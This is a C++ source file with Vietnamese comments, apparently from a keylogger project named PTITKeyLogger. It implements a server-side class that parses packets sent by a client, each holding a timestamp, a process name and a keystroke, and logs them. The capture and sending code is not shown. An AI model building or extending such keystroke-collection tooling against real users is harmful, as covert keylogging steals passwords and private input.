#include "KeystrokeData.hpp"
#include "Protocol.hpp"
#include "TimestampHandle.hpp"
#include "VirtualKeysMap.hpp"
#include <cstring>
#include <iostream>

using namespace std;

/* KeystrokeData
+ Khởi tạo đối tượng KeystrokeData với các giá trị mặc định cho 
timestamp và key.
*/
KeystrokeData::KeystrokeData(): _timestamp(0), _key(0) {}

/* KeystrokeData
+ Constructor này chấp nhận một vectơ data chứa dữ liệu từ gói tin đến từ client.
+ Nó kiểm tra xem kích thước của data có đủ lớn không để chứa thông tin về 
timestamp, key và tên tiến trình không.
+ Nếu kích thước đủ lớn, nó sao chép thông tin timestamp và key từ data vào 
các biến tương ứng trong đối tượng KeystrokeData.
+ Nó cũng sao chép tên tiến trình từ data vào _procName
*/
KeystrokeData::KeystrokeData(const vector<char> &data){
    if (data.size() < sizeof(int) + sizeof(PTITKeyLogger::t_keyboard_event)){
        cerr << "Invalid size of packet for VALID_KEY_EVENT." << endl;
        return;
    }
    _timestamp = *(reinterpret_cast<const int *>(&data[sizeof(int)]));
    _key = *(reinterpret_cast<const int *>(
        &data[sizeof(int) + sizeof(_timestamp) + sizeof(char[256])]));
    
    memcpy(&_procName[0], &data[sizeof(int) + sizeof(_timestamp)],
            sizeof(_procName));
}

/* cloneObj
+ Phương thức này trả về một con trỏ shared_ptr mới cho một đối tượng 
KeystrokeData được tạo từ dữ liệu data.
*/
shared_ptr<IData> KeystrokeData::cloneObj(const vector<char> &data){
    return (make_shared<KeystrokeData>(data));
}

void KeystrokeData::dump() const{

}

/* getData
+ Phương thức này trả về một chuỗi đại diện cho dữ liệu từ gói tin keystroke. 
Nó bao gồm thông tin về timestamp, tên tiến trình và key.
*/
string KeystrokeData::getData(void) const {
  return ("type=Keystroke time=[" +
          TimestampHandle::timeStampToString(_timestamp) +
          "] ProcName=" + _procName + " input=" + virtualKeysMap[_key]);
}

/* feedObj
+ Phương thức này thực hiện một công việc tương tự như constructor KeystrokeData(const vector<char> &data). Nó cũng sao chép thông tin từ data vào
các biến thành viên của đối tượng KeystrokeData, bao gồm timestamp, tên tiến 
trình và key.
*/
void KeystrokeData::feedObj(const vector<char> &data){
    if(data.size() < sizeof(int) + sizeof(PTITKeyLogger::t_keyboard_event)){
        cerr << "Invalid size of packet for VALID_KEY_EVENT." << endl;
        return;
    }

    _timestamp = *(reinterpret_cast<const int *>(&data[sizeof(int)]));
    memcpy(&_procName[0], &data[sizeof(int) + sizeof(_timestamp)],
            sizeof(_procName));
    _key = *(reinterpret_cast<const int *>(
        &data[sizeof(int) + sizeof(_timestamp) + sizeof(_procName)]));
}